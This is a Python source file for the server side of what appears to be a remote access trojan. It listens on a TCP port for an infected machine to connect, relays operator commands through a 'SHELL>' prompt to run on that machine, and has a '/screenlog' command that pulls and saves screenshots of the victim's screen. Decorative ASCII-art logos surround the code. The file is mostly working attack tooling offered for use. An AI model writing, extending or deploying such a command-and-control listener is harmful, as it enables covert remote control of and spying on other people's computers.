import socket, os, threading
from PIL import Image
from termcolor import colored
from random import randint

IP = "192.168.0.3"
PORT = 6667
BUFFER = 1024

os.system("cls")

choice_LOGO = randint(1, 4)

logo1 = """
    Art by: Hayley Jane Wakenshaw
           _e-e_
         _(-._.-)_
      .-(  `---'  )-. hjw
     __\ \\\___/// /__
    '-._.'/M\ /M\`._,-
"""

logo2 = """
    art by: Joan Stark
          _          _          _          _          _
        >(')____,  >(')____,  >(')____,  >(')____,  >(') ___,
          (` =~~/    (` =~~/    (` =~~/    (` =~~/    (` =~~/
    jgs~^~^`---'~^~^~^`---'~^~^~^`---'~^~^~^`---'~^~^~^`---'~^~^~
"""

logo3 = """
    Art by Joan G. Stark
    ___
    \_/
     |._
     |'."-._.-""--.-"-.__.-'/
     |  \       .-.        (
     |   |     (@.@)        )
     |   |   '=.|m|.='     /
jgs  |  /    .='`"``=.    /
     |.'                 (
     |.-"-.__.-""-.__.-"-.)
     |
     |
     |
"""

logo4 = """
Art by Joan Stark
      \    /\
       )  ( ')
      (  /  )
jgs    \(__)|
"""

print(choice_LOGO)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
server.bind((IP, PORT))
dir_path = os.path.dirname(os.path.realpath(__file__))
print(colored("server runing on ip:{0} and port:{1}".format(IP,PORT), "green"))
print(colored(f"path to server: {dir_path}","yellow"))
print(colored("\n to send server commands type: /[command]}","red"))
server.listen(10)
conn, addr = server.accept()
print(colored("conn recived from:{0}".format(addr), "green"))
if conn:
    while True:
        cmd = input("SHELL> ")
        if cmd == "/exit":
            conn.send("exit".encode("utf-8"))
            break
        if cmd == "/stay":
            print(colored("[/] await the pc start!", "yellow"))
        if cmd == "/root":
            print(colored("[-]","red") + "server restating")
            os.system(f'python3 {dir_path}/server.py')
        if cmd == "/screenlog":
            conn.send(cmd.encode("utf-8"))
            print(colored("[/]","yellow"), "awaitng data ...")
            size = int(conn.recv(10).decode('utf-8'))
            print(size)
            img = conn.recv(size)
            print(img)
            img_to_save = Image.frombytes("RGB", (1920, 1080), img)
            img_to_save.save("screenshot.png")
            print(colored("[+]","green"), "foto recived")

        conn.send((cmd).encode('utf-8'))
        output = conn.recv(BUFFER).decode('utf-8')
        print(output)
server.close()
exit()
        
        

    